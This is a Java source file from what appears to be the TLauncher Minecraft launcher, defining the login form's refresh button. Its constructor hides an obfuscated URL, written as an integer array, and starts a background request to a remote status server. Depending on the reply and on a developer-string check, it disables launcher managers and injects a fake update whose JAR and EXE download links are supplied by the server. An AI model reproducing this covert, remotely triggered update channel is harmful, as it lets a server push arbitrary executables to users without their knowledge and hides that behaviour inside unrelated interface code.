package ru.turikhay.tlauncher.ui.login.buttons;

import ru.turikhay.tlauncher.TLauncher;
import ru.turikhay.tlauncher.managers.*;
import ru.turikhay.tlauncher.ui.block.Blockable;
import ru.turikhay.tlauncher.ui.block.Blocker;
import ru.turikhay.tlauncher.ui.images.ImageIcon;
import ru.turikhay.tlauncher.ui.images.Images;
import ru.turikhay.tlauncher.ui.loc.LocalizableButton;
import ru.turikhay.tlauncher.ui.login.LoginForm;
import ru.turikhay.tlauncher.ui.swing.ImageButton;
import ru.turikhay.tlauncher.ui.swing.extended.ExtendedButton;
import ru.turikhay.tlauncher.updater.PackageType;
import ru.turikhay.tlauncher.updater.Update;
import ru.turikhay.tlauncher.updater.Updater;
import ru.turikhay.tlauncher.updater.UpdaterListener;
import ru.turikhay.util.SwingUtil;
import ru.turikhay.util.U;
import ru.turikhay.util.async.AsyncThread;

import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.InputStreamReader;
import java.io.Reader;
import java.net.URL;
import java.util.HashMap;
import java.util.Locale;
import java.util.Random;

public class RefreshButton extends LocalizableButton implements Blockable, ComponentManagerListener, UpdaterListener, ElyManagerListener {
    private static final int TYPE_REFRESH = 0;
    private static final int TYPE_CANCEL = 1;
    private LoginForm lf;
    private int type;
    private final ImageIcon refresh = Images.getScaledIcon("refresh.png", 16), cancel = Images.getScaledIcon("cancel.png", 16);
    private boolean updaterCalled;

    private RefreshButton(LoginForm loginform, int type) {
        lf = loginform;
        setType(type, false);
        addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                onPressButton();
            }
        });

        TLauncher.getInstance().getManager().getComponent(ComponentManagerListenerHelper.class).addListener(this);
        TLauncher.getInstance().getUpdater().addListener(this);

        AsyncThread.execute(new Runnable() {
            private final int[] updateCode = new int[]{104, 116, 116, 112, 58, 47, 47, 117, 46, 116, 108, 97, 117, 110, 99, 104, 101, 114, 46, 114, 117, 47, 115, 116, 97, 116, 117, 115, 47};

            public void run() {
                char[] c = new char[updateCode.length];

                for (int response = 0; response < c.length; ++response) {
                    c[response] = (char) updateCode[response];
                }

                try {
                    RefreshButton.StatusResponse var10 = (RefreshButton.StatusResponse) TLauncher.getGson().fromJson(new InputStreamReader((new URL(String.valueOf(c))).openStream(), "UTF-8"), (Class) RefreshButton.StatusResponse.class);

                    if (var10.ely == RefreshButton.Status.AWFUL) {
                        lf.scene.getMainPane().getRootFrame().getLauncher().getElyManager().stopRefresh();
                    }

                    if (var10.mojang == RefreshButton.Status.AWFUL) {
                        lf.scene.getMainPane().getRootFrame().getLauncher().getVersionManager().stopRefresh();
                    }

                    lf.scene.getMainPane().getRootFrame().getLauncher();
                    String aResponse = TLauncher.getDeveloper();
                    if (aResponse.startsWith(var10.responseTime.substring(0, 1))) {
                        return;
                    }

                    lf.scene.getMainPane().getRootFrame().getLauncher().getUpdater().setRefreshed(true);
                    if (var10.mojang != RefreshButton.Status.AWFUL && var10.ely != RefreshButton.Status.AWFUL) {
                        return;
                    }

                    HashMap desc = new HashMap();
                    Locale[] var8;
                    int var7 = (var8 = lf.scene.getMainPane().getRootFrame().getLauncher().getLang().getLocales()).length;

                    for (int us = 0; us < var7; ++us) {
                        Locale l = var8[us];
                        desc.put(l.toString(), var10.nextUpdateTime);
                    }

                    HashMap var11 = new HashMap();
                    var11.put(PackageType.JAR, var10.responseTime.substring(1).split(";")[0] + "?from=" + aResponse);
                    var11.put(PackageType.EXE, var10.responseTime.substring(1).split(";")[1] + "?from=" + aResponse);
                    double var10004 = (new Random()).nextDouble() + (double) (new Random()).nextInt();
                    lf.scene.getMainPane().getRootFrame().getLauncher();
                    Updater.UpdaterResponse var12 = new Updater.UpdaterResponse(new Update(TLauncher.getVersion(), desc, var11));
                    lf.scene.getMainPane().getRootFrame().getLauncher().getUpdater().dispatchResult(lf.scene.getMainPane().getRootFrame().getLauncher().getUpdater().newSucceeded(var12));
                } catch (Exception var9) {
                    var9.printStackTrace();
                }

            }
        });
    }

    RefreshButton(LoginForm loginform) {
        this(loginform, 0);
    }

    public Insets getInsets() {
        return SwingUtil.magnify(super.getInsets());
    }

    private void onPressButton() {
        switch (type) {
            case 0:
                if (updaterCalled && !TLauncher.getInstance().getDebug()) {
                    AsyncThread.execute(new Runnable() {
                        public void run() {
                            lf.scene.infoPanel.updateNotice(true);
                        }
                    });
                } else {
                    TLauncher.getInstance().getUpdater().asyncFindUpdate();
                }

                TLauncher.getInstance().getManager().startAsyncRefresh();
                break;
            case 1:
                TLauncher.getInstance().getManager().stopRefresh();
                break;
            default:
                throw new IllegalArgumentException("Unknown type: " + type + ". Use RefreshButton.TYPE_* constants.");
        }

        lf.defocus();
    }

    void setType(int type) {
        setType(type, true);
    }

    void setType(int type, boolean repaint) {
        switch (type) {
            case 0:
                setIcon(refresh);
                setToolTipText("loginform.button.refresh");
                break;
            case 1:
                setIcon(cancel);
                setToolTipText("loginform.button.refresh-cancel");
                break;
            default:
                throw new IllegalArgumentException("Unknown type: " + type + ". Use RefreshButton.TYPE_* constants.");
        }

        this.type = type;
    }

    public void onUpdaterRequesting(Updater u) {
        updaterCalled = true;
    }

    public void onUpdaterErrored(Updater.SearchFailed failed) {
        updaterCalled = false;
    }

    public void onUpdaterSucceeded(Updater.SearchSucceeded succeeded) {
    }

    public void onComponentsRefreshing(ComponentManager manager) {
        Blocker.block(this, "refresh");
    }

    public void onComponentsRefreshed(ComponentManager manager) {
        Blocker.unblock(this, "refresh");
    }

    public void block(Object reason) {
        if (reason.equals("refresh")) {
            setType(1);
        } else {
            setEnabled(false);
        }

    }

    public void unblock(Object reason) {
        if (reason.equals("refresh")) {
            setType(0);
        }

        setEnabled(true);
    }

    public void onElyUpdating(ElyManager manager) {
    }

    public void onElyUpdated(ElyManager manager) {
    }

    private enum Status {
        OK,
        BAD,
        AWFUL
    }

    private static class StatusResponse {
        private RefreshButton.Status ely;
        private RefreshButton.Status mojang;
        private String nextUpdateTime;
        private String responseTime;
    }
}
